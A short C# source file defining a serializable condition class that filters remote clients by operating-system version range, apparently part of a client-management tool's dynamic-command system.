using System;
using Orcus.Shared.Client;
using Orcus.Shared.Connection;

namespace Orcus.Shared.DynamicCommands.Conditions
{
    /// <summary>
    ///     Condition which filters the clients by the operating system
    /// </summary>
    [Serializable]
    public class OperatingSystemCondition : Condition
    {
        public OSType MinimumOsVersion { get; set; }
        public OSType MaximumOsVersion { get; set; }

        public override string DisplayString => $"{MaximumOsVersion} ≥ Operating System ≥ {MinimumOsVersion}";
        public override string ConditionType => "Operating System";

        public override bool IsTrue(ClientInformation clientInformation, ClientConfig clientConfig)
        {
            return clientInformation.OsType >= MinimumOsVersion &&
                   clientInformation.OsType <= MaximumOsVersion;
        }
    }
}